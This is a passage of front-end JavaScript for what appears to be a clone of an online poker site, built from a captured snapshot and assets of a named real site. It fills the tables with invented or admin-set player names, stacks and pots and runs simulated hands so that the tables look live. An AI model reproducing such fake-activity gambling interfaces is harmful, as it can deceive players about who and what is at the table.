        '#settings-popup .sys-lang-row{display:flex;align-items:center;gap:12px;width:100%;padding:14px 0 4px}' +
        '#settings-popup .sys-lang-select{background:#2b2b2b;color:#fff;border:1px solid rgba(255,255,255,.2);border-radius:6px;padding:7px 10px;font-size:14px;cursor:pointer;outline:none}' +
        '#settings-popup .sys-lang-select:focus{border-color:#d4ac0d}' +
        '#settings-popup .sys-lang-label{color:#fff;font-size:14px}' +
        /* Table themes */
        '#settings-popup .tt-wrap{display:flex;gap:32px;width:100%;padding:2px 2px 8px;box-sizing:border-box;color:#fff}' +
        '#settings-popup .tt-col.left{flex:0 0 auto}' +
        '#settings-popup .tt-col.right{flex:1 1 auto;min-width:0}' +
        '#settings-popup .tt-decks{display:flex;gap:12px;flex-wrap:wrap;max-width:230px}' +
        '#settings-popup .tt-deck{position:relative;border:2px solid transparent;border-radius:6px;padding:4px;background:#fff;cursor:pointer;box-sizing:border-box}' +
        '#settings-popup .tt-deck.sel{border-color:#5aa0e0}' +
        '#settings-popup .tt-deck .appth-check{position:absolute;right:-7px;bottom:-7px;width:20px;height:20px;border-radius:50%;background:#e23b2e;color:#fff;font-size:12px;line-height:20px;text-align:center;display:none;box-shadow:0 0 0 2px #3a3a3a}' +
        '#settings-popup .tt-deck.sel .appth-check{display:block}' +
        '#settings-popup .deck-card{display:grid;grid-template-columns:1fr 1fr;gap:3px 8px;padding:6px 8px}' +
        '#settings-popup .deck-suit{font-size:15px;font-weight:bold;display:flex;align-items:center;gap:1px}' +
        '#settings-popup .deck-suit b{font-size:13px}' +
        '#settings-popup .tt-table{background:#1d1d1d;border-radius:8px;padding:12px;max-width:430px}' +
        '#settings-popup .tt-felt{position:relative;height:210px;background:radial-gradient(ellipse at center,#2f8f4e 0%,#1f6d38 70%);border:6px solid #caa64a;border-radius:110px/95px;margin-bottom:10px}' +
        '#settings-popup .tt-pot{position:absolute;top:58px;left:0;right:0;text-align:center;color:#fff;font-size:12px;opacity:.85}' +
        '#settings-popup .tt-board{position:absolute;top:88px;left:0;right:0;display:flex;justify-content:center;align-items:center;gap:3px}' +
        '#settings-popup .tt-card{background:#fff;color:#111;font-size:12px;font-weight:bold;border-radius:3px;padding:3px 5px;line-height:1}' +
        '#settings-popup .tt-card.r{color:#c62828}' +
        '#settings-popup .tt-fire{font-size:15px;margin-left:2px}' +
        '#settings-popup .tt-seat{position:absolute;background:#3b4b78;color:#fff;font-size:9px;text-align:center;padding:3px 6px;border-radius:9px;white-space:nowrap;line-height:1.25}' +
        '#settings-popup .tt-seat.s0{top:-8px;left:50%;transform:translateX(-50%)}' +
        '#settings-popup .tt-seat.s1{top:34px;right:-14px}' +
        '#settings-popup .tt-seat.s2{bottom:34px;right:-14px}' +
        '#settings-popup .tt-seat.s3{bottom:-8px;left:50%;transform:translateX(-50%)}' +
        '#settings-popup .tt-seat.s4{bottom:34px;left:-14px}' +
        '#settings-popup .tt-seat.s5{top:34px;left:-14px}' +
        '#settings-popup .tt-actions{display:flex;align-items:center;gap:5px;flex-wrap:wrap}' +
        '#settings-popup .tt-btn{color:#fff;font-size:10px;text-align:center;border-radius:4px;padding:5px 8px;line-height:1.2}' +
        '#settings-popup .tt-btn.time{background:#c9a227}' +
        '#settings-popup .tt-btn.fold{background:#c0392b}' +
        '#settings-popup .tt-btn.call{background:#2e7d46}' +
        '#settings-popup .tt-btn.raise{background:#2e7d46}' +
        '#settings-popup .tt-bet{background:#fff;color:#111;font-size:11px;border-radius:4px;padding:5px 10px}' +
        '#settings-popup .tt-chip{background:#3a3a3a;color:#fff;font-size:10px;border:1px solid rgba(255,255,255,.25);border-radius:4px;padding:4px 8px}';
      document.head.appendChild(sc);
    }

    var el = document.createElement('div');
    el.id = 'settings-popup';
    el.style.cssText = 'display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;align-items:center;justify-content:center;';

    el.innerHTML =
      '<div id="settings-modal-bg" style="position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.58);"></div>' +
      '<div class="SettingsPopupContainer Dialog Dialog_v_default Dialog_c_dark"' +
      '     style="position:relative;width:auto;height:auto;background:transparent;border:none;">' +

        '<div class="panel Popup__content Dialog__popup_content show-dialog-animation" tabindex="-1">' +

          '<div class="Dialog__header">' +
            '<div class="Dialog__title">' +
              '<div class="Dialog__title_content" style="color:#d4ac0d;">SETTINGS</div>' +
            '</div>' +
            '<div class="Dialog__top_actions">' +
              '<div id="settings-close-btn"' +
              '     class="panel button SimpleButton SimpleButton_v_transparent SimpleButton_c_blue SimpleButton_use_icon Dialog__top_action close_button SimpleButton_interactive"' +
              '     tabindex="-1">' +
                '<div class="SimpleButton__content">' +
                  '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_close_popup SimpleButton__icon Dialog__top_action_icon" tabindex="-1">' +
                    '<div class="Icon__content"></div>' +
                  '</div>' +
                '</div>' +
              '</div>' +
            '</div>' +
          '</div>' +

          '<div class="Dialog__tabs">' +
            '<div class="TabButtonsRow TabButtonsRow_v_small_flat TabButtonsRow_c_blue horizontal Dialog__tabs_content">' +
              '<div class="TabButtonsRow__items" id="settings-tabs">' +
                settingsTabTitles.map(function (title, i) {
                  var sel = i === 0
                    ? 'TabButton_selected disable'
                    : 'TabButton_interactive';
                  return '<div class="panel button TabButton TabButton_v_flat TabButton_c_blue TabButton_use_text TabButtonsRow__button ' + sel + '" tabindex="-1">' +
                    '<div class="TabButton__content"><div class="TabButton__text">' + title + '</div></div>' +
                  '</div>';
                }).join('') +
              '</div>' +
            '</div>' +
          '</div>' +

          '<div class="Dialog__content">' +
            '<div class="SettingsPopupContainer__content">' +
              '<div class="scroll-panel" style="position:relative;height:100%;width:100%;overflow:hidden;touch-action:none;">' +
                '<div class="scroll-wrapper" style="transform:translate(0px,0px) translateZ(0px)">' +
                  '<div class="TableSettingsContainer TableSettingsContainer_v_popup_content TableSettingsContainer_c_dark sp-table-settings TableSettingsLobbyWrapContainer">' +
                    '<div class="TableSettingsContainer__content">' +
                      '<div class="TableSettingsContainer__content_items" id="settings-items">' +

                        settingsGroupsHtml() +

                      '</div>' +
                    '</div>' +
                  '</div>' +
                '</div>' +
              '</div>' +
            '</div>' +
          '</div>' +

          '<div class="Dialog__actions">' +
            '<div id="settings-reset-btn"' +
            '     class="panel button SimpleButton SimpleButton_v_text SimpleButton_c_light SimpleButton_use_text_use_icon Dialog__action reset SimpleButton_interactive"' +
            '     tabindex="0">' +
              '<div class="SimpleButton__content">' +
                '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_reset SimpleButton__icon Dialog__action_icon" tabindex="-1"><div class="Icon__content"></div></div>' +
                '<div class="SimpleButton__text">Reset settings</div>' +
              '</div>' +
            '</div>' +
            '<div id="settings-save-btn"' +
            '     class="panel button SimpleButton SimpleButton_v_flat SimpleButton_c_success_blue SimpleButton_use_text Dialog__action save SimpleButton_interactive"' +
            '     tabindex="0">' +
              '<div class="SimpleButton__content"><div class="SimpleButton__text">SAVE</div></div>' +
            '</div>' +
          '</div>' +

        '</div>' +
      '</div>';

    return el;
  }

  function cbItem(key, label, checked) {
    var c = checked ? ' Checkbox_checked' : '';
    return '<div class="panel FormField FormField_v_default FormField_c_light TableSettingsContainer__setting_item ' + key + ' FormField_reverse FormField_useLabel" tabindex="-1">' +
      '<div class="FormField__content">' +
        '<div class="FormField__clickable_label">' +
          '<div class="panel FormField__clickable_label__value" tabindex="-1">' +
            '<div class="FormField__label"><div class="FormField__label_text">' + label + '</div></div>' +
          '</div>' +
        '</div>' +
        '<div class="FormField__control">' +
          '<div class="panel Checkbox Checkbox_v_checkbox Checkbox_c_blue TableSettingsContainer__setting_item_checkbox' + c + '" tabindex="0">' +
            '<div class="Checkbox__content">' +
              '<div class="panel Icon Icon_v_default Icon_c_light Icon_val_ Checkbox__checkmark" tabindex="-1"><div class="Icon__content"></div></div>' +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>' +
    '</div>';
  }

  function showSettings() {
    var p = document.getElementById('settings-popup');
    if (p) p.style.display = 'flex';
  }

  function hideSettings() {
    var p = document.getElementById('settings-popup');
    if (p) p.style.display = 'none';
  }

  /* ═══════════════════════════════════════
     TABLE VIEW  — Play → open the real table (table.html) in an overlay
  ═══════════════════════════════════════ */
  // Deterministic PRNG seeded from a string, so the same table always looks
  // the same but different tables differ.
  function seededRng(seed) {
    var h = 1779033703 ^ seed.length;
    for (var i = 0; i < seed.length; i++) {
      h = Math.imul(h ^ seed.charCodeAt(i), 3432918353);
      h = (h << 13) | (h >>> 19);
    }
    return function () {
      h = Math.imul(h ^ (h >>> 16), 2246822507);
      h = Math.imul(h ^ (h >>> 13), 3266489909);
      var t = (h ^= h >>> 16) >>> 0;
      return t / 4294967296;
    };
  }

  var TABLE_NAME_POOL = [
    'bataa07', 'Ganzo', 'Munkhuu', 'Temka', 'Bold99', 'Saraa', 'Dorj_88',
    'Enkhjin', 'Tuvshin', 'Zaya21', 'Otgoo', 'Baterdene', 'Nomin', 'Gerlee',
    'Chuluun', 'Amaraa', 'Bilguun', 'Khulan', 'Tengis', 'Anujin', 'Erka',
    'Sukhee', 'Nyamka', 'Battur', 'Oyun', 'Gantulga', 'Marlaa', 'Puujee',
    'Soyol', 'Uugii', 'Bayraa', 'Delgersaikhan', 'Ochir', 'Naran'
  ];

  function fmtMoney(n) {
    return Math.round(n).toLocaleString('en-US');
  }

  // The roster for a table: admin-configured players (from /admin.html) where
  // set, otherwise seeded-random names/stacks. Same result everywhere the
  // table appears (right-side info panel and the opened table).
  // Avatar ids that exist on the avatar server (180–203, 206–214).
  var TABLE_AVATAR_POOL = (function () {
    var ids = [];
    for (var i = 180; i <= 214; i++) if (i !== 204 && i !== 205) ids.push(i);
    return ids;
  })();
  function avatarUrl(id) {
    return 'https://web.mashnuuts.org/files/avatars/' + id + '/' + id + '.png';
  }

  function tableRoster(name, bb, count) {
    var cfg = null;
    try { cfg = (JSON.parse(localStorage.getItem('hairaa_table_players') || '{}'))[name] || null; }
    catch (e) { cfg = null; }
    var rnd = seededRng(name || '');
    var pool = TABLE_NAME_POOL.slice();
    for (var i = pool.length - 1; i > 0; i--) {
      var j = Math.floor(rnd() * (i + 1));
      var tmp = pool[i]; pool[i] = pool[j]; pool[j] = tmp;
    }
    var avatars = TABLE_AVATAR_POOL.slice();
    for (var m = avatars.length - 1; m > 0; m--) {
      var n = Math.floor(rnd() * (m + 1));
      var t = avatars[m]; avatars[m] = avatars[n]; avatars[n] = t;
    }
    var out = [];
    for (var k = 0; k < count; k++) {
      var c = cfg && cfg[k];
      out.push({
        name: c && c.name ? c.name : pool[k % pool.length],
        stack: c && c.stack != null ? c.stack : Math.round((10 + rnd() * 110) * (bb || 100)),
        avatar: avatarUrl(avatars[k % avatars.length])
      });
    }
    return out;
  }

  // The captured table is a fixed 1221x725 snapshot; the live site scales it
  // to the window. Do the same: grow/shrink the game area (everything inside
  // is em-based off its font-size) so the table fills the frame.
  var TV_BASE = { cw: 1221, ch: 985, gw: 1221, gh: 725, fs: 19.0781 };
  function fitTable(frame) {
    try {
      var doc = frame.contentDocument, win = frame.contentWindow;
      if (!doc || !win) return;
      var W = win.innerWidth, H = win.innerHeight;
      if (!W || !H) return;                     // hidden tab: fit when shown
      // fill the window like the live site: only keep a slim band for the
      // header icons / chat instead of the snapshot's 260px reserve
      var k = Math.min(W / TV_BASE.gw, (H - 110) / TV_BASE.gh);
      var sc = doc.querySelector('.screens-container');
      if (sc) { sc.style.width = W + 'px'; sc.style.height = H + 'px'; }
      var ga = doc.querySelector('.r-game-area');
      if (ga) {
        ga.style.width = Math.round(TV_BASE.gw * k) + 'px';
        ga.style.height = Math.round(TV_BASE.gh * k) + 'px';
        ga.style.fontSize = (TV_BASE.fs * k) + 'px';
      }
      if (!frame.__tvFitBound) {
        frame.__tvFitBound = true;
        win.addEventListener('resize', function () { fitTable(frame); });
      }
    } catch (e) { /* not ready */ }
  }

  // Rewrite the captured snapshot to the clicked table: centre label plus
  // randomised (but per-table stable) player names, stacks and pot.
  function applyTableData(frame, info) {
    if (!frame || !info) return;
    try {
      var doc = frame.contentDocument;
      if (!doc) return;

      var label = doc.querySelector('.table-name');
      if (label) label.textContent = info.name + '\n' + info.game + '\nStakes: ' + info.stakes;

      var rnd = seededRng(info.name);

      // big blind from the stakes text (e.g. "1,000/2,000" -> 2000)
      var parts = (info.stakes || '').replace(/,/g, '').split('/');
      var bb = parseFloat(parts[1] || parts[0]) || 100;

      // Seat only as many players as the table has; the rest are empty with
      // a "Суух" (sit) button. Roster is admin-configured or seeded.
      var seated = Math.max(1, Math.min(9, info.seated || 9));
      var roster = tableRoster(info.name, bb, seated);
      for (var si = 0; si < 9; si++) {
        var seatEl = doc.querySelector('.r-seat.s-' + si);
        if (!seatEl) continue;
        var pEl = seatEl.querySelector('.r-player');
        var nmEl = seatEl.querySelector('.player-name');
        var cashEl = seatEl.querySelector('.player-cash');
        var betEl = doc.querySelector('.r-player-bet.s-' + si + ' .r-player-bet-content');
        var sit = seatEl.querySelector('.tv-sit');
        if (si < seated) {
          if (pEl) pEl.style.visibility = '';
          if (nmEl && roster[si]) nmEl.textContent = roster[si].name;
          if (cashEl && roster[si]) cashEl.textContent = fmtMoney(roster[si].stack);
          var avEl = seatEl.querySelector('.r-player-avatar .Avatar');
          if (avEl && roster[si]) avEl.style.backgroundImage = 'url("' + roster[si].avatar + '")';
          if (sit) sit.parentNode.removeChild(sit);
        } else {
          if (pEl) pEl.style.visibility = 'hidden';
          if (nmEl) nmEl.textContent = '';
          if (cashEl) cashEl.textContent = '';
          if (betEl) betEl.innerHTML = '';
          if (!sit) {
            // same round "SEAT OPEN" button the live site shows on empty seats,
            // centred on the whole seat (avatar + name bar) so it never
            // overlaps the neighbouring seat below
            var anchor = seatEl;
            if (getComputedStyle(anchor).position === 'static') anchor.style.position = 'relative';
            sit = doc.createElement('div');
            sit.className = 'tv-sit';
            sit.innerHTML = 'SEAT<br>OPEN';
            sit.style.cssText = 'position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);' +
              'width:4.9em;height:4.9em;border-radius:50%;background:rgba(40,42,58,.85);' +
              'border:.1em solid rgba(255,255,255,.38);color:#e6e8ee;font-weight:normal;' +
              'font-size:1em;line-height:1.15;display:flex;align-items:center;justify-content:center;' +
              'text-align:center;z-index:7;cursor:pointer;visibility:visible;box-shadow:0 .1em .4em rgba(0,0,0,.5);';
            sit.addEventListener('click', function (e) { e.stopPropagation(); tableSit(); });
            anchor.appendChild(sit);
          } else {
            sit.style.display = 'flex';
          }
        }
      }

      // pot: 1–9 big blinds
      var pot = doc.querySelector('.bank-container-content');
      if (pot) pot.textContent = 'Pot: ' + fmtMoney((1 + rnd() * 8) * bb);

      wireTableButtons(doc);
      addSoundToggle(doc);
      // hole cards per player: Hold'em 2, Omaha 4, 5/6 Card Omaha 5/6
      var g = String(info.game || '');
      var holeN = /6 Card/i.test(g) ? 6 : /5 Card/i.test(g) ? 5 : /Omaha/i.test(g) ? 4 : 2;
      startTableSim(doc, bb, holeN);
    } catch (e) { /* cross-origin or not ready */ }
  }

  // Wire the table's own header buttons. Lobby goes back to the lobby
  // (tables stay open as tabs), exit closes this table, and "+" returns to
  // the lobby so another table can be picked and added as a new tab.
  function wireTableButtons(doc) {
    if (!doc || doc.__tvWired) return;
    doc.__tvWired = true;
    function on(sel, fn) {
      var btn = doc.querySelector(sel);
      if (btn) btn.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        fn();
      });
    }
    on('.TableHeaderContainer__lobby_button', hideTable);
    on('.TableHeaderContainer__exit_button', closeActiveTable);
    on('.add-table-button', hideTable);
  }

  /* ═══════════════════════════════════════
     MULTI-TABLE TABS — one iframe per open table
  ═══════════════════════════════════════ */
  var openTables = [];      // [{ info, frame }]
  var activeTable = -1;

  function showTableAt(i) {
    activeTable = i;
    openTables.forEach(function (t, k) { t.frame.style.display = k === i ? 'block' : 'none'; });
    if (openTables[i]) fitTable(openTables[i].frame);
    renderTableTabs();
  }

  function closeActiveTable() {
    var t = openTables[activeTable];
    if (!t) { hideTable(); return; }
    try { stopTableSim(t.frame.contentDocument); } catch (e) {}
    t.frame.remove();
    openTables.splice(activeTable, 1);
    if (!openTables.length) { activeTable = -1; hideTable(); return; }
    showTableAt(Math.max(0, activeTable - 1));
  }

  // Draw one indicator per open table in every frame's header, before "+".
  function renderTableTabs() {
    openTables.forEach(function (owner) {
      var doc;
      try { doc = owner.frame.contentDocument; } catch (e) { return; }
      if (!doc) return;
      var wrap = doc.querySelector('.table-router-container .scroll-wrapper');
      var addBtn = wrap && wrap.querySelector('.add-table-button');
      if (!addBtn) return;
      if (!doc.__tvTabTpl) {
        var orig = wrap.querySelector('.table-indicator');
        if (!orig) return;
        doc.__tvTabTpl = orig.cloneNode(true);
        orig.remove();
      }
      wrap.querySelectorAll('[data-tv-tab]').forEach(function (el) { el.remove(); });
      openTables.forEach(function (t, k) {
        var tab = doc.__tvTabTpl.cloneNode(true);
        tab.setAttribute('data-tv-tab', k);
        tab.classList.toggle('active', k === activeTable);
        tab.classList.toggle('inactive', k !== activeTable);
        tab.title = (t.info && t.info.name) || 'Table';
        tab.style.cursor = 'pointer';
        tab.addEventListener('click', function (e) {
          e.preventDefault();
          e.stopPropagation();
          showTableAt(k);
        });
        wrap.insertBefore(tab, addBtn);
      });
    });
  }

  /* ═══════════════════════════════════════
     CARD FACES — the real site's card SVGs (hairaa.net res-1, saved in /cards)
  ═══════════════════════════════════════ */
  var CARD_IMG = null;
  try {
    fetch('/cards/cards.json').then(function (r) { return r.json(); })
      .then(function (m) { CARD_IMG = m; }).catch(function () {});
  } catch (e) {}

  /* ═══════════════════════════════════════
     SOUND — synthesized with WebAudio (no audio files needed)
  ═══════════════════════════════════════ */
  var sfxCtx = null, sfxMuted = false;
  try { sfxMuted = localStorage.getItem('tvMuted') === '1'; } catch (e) {}
  function sfxUnlock() {
    try {
      if (!sfxCtx) sfxCtx = new (window.AudioContext || window.webkitAudioContext)();
      if (sfxCtx.state === 'suspended') sfxCtx.resume();
      sfxLoad();
    } catch (e) {}
  }
  document.addEventListener('pointerdown', sfxUnlock, true);
  document.addEventListener('keydown', sfxUnlock, true);

  function sfxNoise(t, dur, freq, q, vol, type) {   // filtered noise burst
    var len = Math.ceil(sfxCtx.sampleRate * dur), buf = sfxCtx.createBuffer(1, len, sfxCtx.sampleRate);
    var d = buf.getChannelData(0);
    for (var i = 0; i < len; i++) d[i] = (Math.random() * 2 - 1) * Math.pow(1 - i / len, 2);
    var src = sfxCtx.createBufferSource(); src.buffer = buf;
    var f = sfxCtx.createBiquadFilter(); f.type = type || 'bandpass'; f.frequency.value = freq; f.Q.value = q;
    var g = sfxCtx.createGain(); g.gain.value = vol;
    src.connect(f); f.connect(g); g.connect(sfxCtx.destination);
    src.start(t);
  }
  function sfxTone(t, freq, dur, vol, type) {       // short decaying tone
    var o = sfxCtx.createOscillator(), g = sfxCtx.createGain();
    o.type = type || 'sine'; o.frequency.value = freq;
    g.gain.setValueAtTime(vol, t);
    g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
    o.connect(g); g.connect(sfxCtx.destination);
    o.start(t); o.stop(t + dur + 0.02);
  }
  function sfxClick(t, vol) {                        // one chip hitting another
    sfxTone(t, 3100 + Math.random() * 900, 0.05, vol * 0.5, 'triangle');
    sfxTone(t, 5200 + Math.random() * 800, 0.03, vol * 0.25, 'sine');
    sfxNoise(t, 0.03, 4000, 1.5, vol * 0.6);
  }
  var SFX = {
    card: function (t) { sfxNoise(t, 0.09, 2600, 0.8, 0.5, 'highpass'); },
    flip: function (t) { sfxNoise(t, 0.06, 1800, 1, 0.6); sfxNoise(t + 0.05, 0.05, 3200, 1, 0.35); },
    chips: function (t, n) {
      n = n || 3;
      for (var i = 0; i < n; i++) sfxClick(t + i * (0.035 + Math.random() * 0.03), 0.5 - i * 0.05);
    },
    check: function (t) {                            // two knuckle knocks on felt
      [0, 0.11].forEach(function (dt) { sfxTone(t + dt, 150, 0.09, 0.6); sfxNoise(t + dt, 0.04, 600, 2, 0.5); });
    },
    fold: function (t) { sfxNoise(t, 0.22, 1200, 0.6, 0.35, 'lowpass'); },
    allin: function (t) { SFX.chips(t, 7); sfxTone(t, 220, 0.35, 0.15, 'sawtooth'); },
    win: function (t) {
      SFX.chips(t, 9);
      [523, 659, 784].forEach(function (f, i) { sfxTone(t + 0.1 + i * 0.09, f, 0.3, 0.12); });
    },
    turn: function (t) { sfxTone(t, 880, 0.12, 0.12); sfxTone(t + 0.08, 1320, 0.15, 0.08); }
  };
  // The real site's sound pack (hairaa.net res/res-NN.mp3, saved in /sounds).
  var SFX_FILES = {
    bet: 23, bb: 24, call: 26, check: 27, fold: 28, muck: 30, raise: 31,
    show: 32, sb: 33, congrats: 35, card: 37, flip: 37, chips: 38, turn: 41, shuffle: 43
  };
  var sfxBufs = {}, sfxLoading = false;
  function sfxLoad() {
    if (sfxLoading || !sfxCtx) return;
    sfxLoading = true;
    Object.keys(SFX_FILES).forEach(function (k) {
      var n = SFX_FILES[k];
      if (sfxBufs[n] !== undefined) return;
      sfxBufs[n] = null;
      fetch('/sounds/res-' + n + '.mp3').then(function (r) { return r.arrayBuffer(); })
        .then(function (a) { return new Promise(function (ok, no) { sfxCtx.decodeAudioData(a, ok, no); }); })
        .then(function (b) { sfxBufs[n] = b; }).catch(function () {});
    });
  }
  function sfxPlayFile(name, t, vol) {
    var b = sfxBufs[SFX_FILES[name]];
    if (!b) return false;
    var src = sfxCtx.createBufferSource(), g = sfxCtx.createGain();
    src.buffer = b; g.gain.value = vol == null ? 1 : vol;
    src.connect(g); g.connect(sfxCtx.destination); src.start(t);
    return true;
  }
  // Plays only for the table currently on screen.
  function sfx(doc, name, delay, arg) {
    if (sfxMuted || !sfxCtx || sfxCtx.state !== 'running') return;
    try {
      var fe = doc && doc.defaultView && doc.defaultView.frameElement;
      if (fe && (fe.style.display === 'none' || !fe.getClientRects().length)) return;
      var t = sfxCtx.currentTime + (delay || 0);
      if (sfxPlayFile(name, t)) return;
      (SFX[name] || SFX.chips)(t, arg);         // synth fallback until files load
    } catch (e) {}
  }

  // Speaker toggle in the table's top-right corner.
  function addSoundToggle(doc) {
    if (!doc || doc.querySelector('.tv-sound')) return;
    doc.addEventListener('pointerdown', sfxUnlock, true);
    var b = doc.createElement('div');
    b.className = 'tv-sound';
    b.style.cssText = 'position:fixed;right:14px;bottom:14px;width:36px;height:36px;border-radius:50%;' +
      'background:rgba(0,0,0,.45);color:#fff;display:flex;align-items:center;justify-content:center;' +
      'font-size:18px;cursor:pointer;z-index:999;user-select:none;';
    function paint() { b.textContent = sfxMuted ? '🔇' : '🔊'; b.title = sfxMuted ? 'Sound off' : 'Sound on'; }
    paint();
    b.addEventListener('click', function (e) {
      e.stopPropagation(); sfxUnlock();
      sfxMuted = !sfxMuted;
      try { localStorage.setItem('tvMuted', sfxMuted ? '1' : '0'); } catch (e2) {}
      document.querySelectorAll('iframe').forEach(function (f) {
        try { var x = f.contentDocument.querySelector('.tv-sound'); if (x) x.textContent = sfxMuted ? '🔇' : '🔊'; } catch (e3) {}
      });
      paint();
    });
    doc.body.appendChild(b);
  }

  /* ═══════════════════════════════════════
     SIMULATED GAMEPLAY  — makes the table feel live
  ═══════════════════════════════════════ */
  // Each table document keeps its own timer so several tables can run.
  function stopTableSim(doc) {
    if (doc && doc.__tvSimTimer) { clearInterval(doc.__tvSimTimer); doc.__tvSimTimer = null; }
  }

  function startTableSim(doc, bb, holeN) {
    if (!doc) return;
    holeN = holeN || 2;
    var omaha = holeN > 2;                       // must use exactly 2 hole + 3 board
    stopTableSim(doc);
    bb = bb || 100;
    var sb = Math.max(1, Math.round(bb / 2));

    var SUITS = [['♠', '#111'], ['♥', '#c62828'], ['♦', '#c62828'], ['♣', '#111']];

    // ── Real casino chips (lifted from the live site's chip SVG) ──────────
    // Each denomination keeps its own side colour + two-stop face gradient.
    // k-5 red, k-10 teal and k-25 green are the exact site colours; the rest
    // follow the same art with standard casino hues.
    var CHIP_DENOMS = [
      [1000000, '#8a2a5a', '#d9699e', '#e88fb8'],   // pink   1M
      [100000,  '#8a4300', '#e07b2b', '#f4a460'],   // orange 100K
      [25000,   '#00664E', '#0C8165', '#00AE85'],   // green  25K (real k-25)
      [10000,   '#3490A4', '#37BCD9', '#62E3FF'],   // teal   10K (real k-10)
      [5000,    '#B4151E', '#B4151E', '#FF1725'],   // red    5K  (real k-5)
      [1000,    '#8a6a00', '#e8b923', '#f3d64b'],   // yellow 1K
      [500,     '#4a1f72', '#8a48c4', '#a86fe0'],   // purple 500
      [100,     '#16284d', '#2a4a8a', '#3f66b5'],   // navy   100
      [25,      '#145c2a', '#2e9e4f', '#56c878'],   // green  25
      [5,       '#7d1414', '#d23b3b', '#f06a6a'],   // red    5
      [1,       '#8a8a8a', '#d8d8d8', '#ffffff']    // white  1
    ];
    var chipUid = 0;
    // One chip rendered as the site's exact SVG, recoloured for this value.
    function chipSvg(side, g1, g2, em) {
      var id = 'tvchip' + (++chipUid);
      return '<svg viewBox="0 0 40 36" style="width:' + em + 'em;height:' + (em * 0.9) +
        'em;display:block;" xmlns="http://www.w3.org/2000/svg">' +
        '<path d="M40 21C40 29.2843 31.0457 36 20 36C8.9543 36 0 29.2843 0 21V15C13.6657 15 29.8679 15 40 15V21Z" fill="' + side + '"/>' +
        '<path d="M20 30C31.0457 30 40 23.2843 40 15C40 6.71573 31.0457 0 20 0C8.9543 0 0 6.71573 0 15C0 23.2843 8.9543 30 20 30Z" fill="url(#' + id + ')"/>' +
        '<path d="M35.1957 30.721L35.1533 24.7911C36.8524 23.2559 37.9896 21.8107 38.8994 19.9219L38.8993 25.8134C38.0188 27.7583 36.9104 29.1595 35.1957 30.721Z" fill="#A7A7A7"/>' +
        '<path d="M23.167 35.8008V29.8086C22.1144 29.9422 21.0776 29.991 20 29.991C18.9224 29.991 17.8745 29.9362 16.833 29.8086V35.8008C17.8672 35.9492 18.9224 35.9922 20 35.9922C21.0776 35.9922 22.1211 35.9336 23.167 35.8008Z" fill="#A7A7A7"/>' +
        '<path d="M4.84478 24.8146L4.80235 30.7444C3.08764 29.1829 1.97926 27.7817 1.09878 25.8368L1.09863 19.9453C2.0084 21.8341 3.14561 23.2793 4.84478 24.8146Z" fill="#A7A7A7"/>' +
        '<path d="M23.1507 0.185924C22.1217 0.063554 21.0666 0 19.9917 0C18.9169 0 17.8618 0.0635542 16.8328 0.185924V2.5C16.8328 2.77614 17.0567 3 17.3328 3H22.6507C22.9268 3 23.1507 2.77614 23.1507 2.5V0.185924Z" fill="white"/>' +
        '<path d="M32.9873 3.5951C34.8184 4.76908 36.3633 6.18661 37.533 7.78078L35.3767 9.6321C35.1748 9.80549 34.8724 9.79028 34.6889 9.59749L31.1424 5.87198C30.945 5.66468 30.9616 5.33433 31.1788 5.14788L32.9873 3.5951Z" fill="white"/>' +
        '<path d="M35.1527 24.7876C36.7827 23.3696 38.0647 21.7205 38.8996 19.9147L36.409 17.7763C36.2071 17.6029 35.9047 17.6181 35.7212 17.8109L32.1739 21.5372C31.9765 21.7445 31.9931 22.0749 32.2103 22.2613L35.1527 24.7876Z" fill="white"/>' +
        '<path d="M19.9917 30C21.0666 30 22.1217 29.9364 23.1507 29.8141V25.5C23.1507 25.2239 22.9268 25 22.6507 25H17.3328C17.0567 25 16.8328 25.2239 16.8328 25.5V29.8141C17.8618 29.9364 18.9169 30 19.9917 30Z" fill="white"/>' +
        '<path d="M2.49505 7.72042C3.67336 6.1318 5.22538 4.72041 7.06203 3.55305L8.87716 5.1115C9.09432 5.29795 9.11095 5.6283 8.9136 5.83561L5.36708 9.56111C5.18356 9.7539 4.88117 9.76911 4.67922 9.59572L2.49505 7.72042Z" fill="white"/>' +
        '<path d="M1.09961 19.9486C1.93969 21.7516 3.22597 23.3976 4.85922 24.8123L7.76774 22.3151C7.9849 22.1286 8.00152 21.7983 7.80418 21.591L4.25599 17.8637C4.07247 17.6709 3.77009 17.6557 3.56814 17.8291L1.09961 19.9486Z" fill="white"/>' +
        '<path fill-rule="evenodd" clip-rule="evenodd" d="M28.3548 18.6928C30.4373 17.2911 31.5 15.5154 31.5 13.75C31.5 11.9846 30.4373 10.2089 28.3548 8.8072C26.2815 7.41172 23.3321 6.5 20 6.5C16.6679 6.5 13.7185 7.41172 11.6452 8.8072C9.56269 10.2089 8.5 11.9846 8.5 13.75C8.5 15.5154 9.56269 17.2911 11.6452 18.6928C13.7185 20.0883 16.6679 21 20 21C23.3321 21 26.2815 20.0883 28.3548 18.6928ZM33 13.75C33 18.5825 27.1797 22.5 20 22.5C12.8203 22.5 7 18.5825 7 13.75C7 8.91751 12.8203 5 20 5C27.1797 5 33 8.91751 33 13.75Z" fill="white"/>' +
        '<path d="M20 34C31.0457 34 40 27.2843 40 19V21C40 29.2843 31.0457 36 20 36C8.9543 36 0 29.2843 0 21V19C0 27.2843 8.9543 34 20 34Z" fill="black" fill-opacity="0.45"/>' +
        '<path d="M39.9563 14C39.2701 21.818 30.5977 28 20 28C9.40234 28 0.729856 21.818 0.0437396 14C0.0147325 14.3305 0 14.664 0 15C0 23.2843 8.9543 30 20 30C31.0457 30 40 23.2843 40 15C40 14.664 39.9853 14.3305 39.9563 14Z" fill="white" fill-opacity="0.35"/>' +
        '<defs><linearGradient id="' + id + '" x1="20" y1="0" x2="20" y2="30" gradientUnits="userSpaceOnUse">' +
        '<stop stop-color="' + g1 + '"/><stop offset="1" stop-color="' + g2 + '"/></linearGradient></defs></svg>';
    }
    // Break a bet into chip denominations and stack them (largest at bottom),
    // capped so the stack stays short. Returns the stacked chip column HTML.
    function chipStack(value, em) {
      em = em || 1.5;
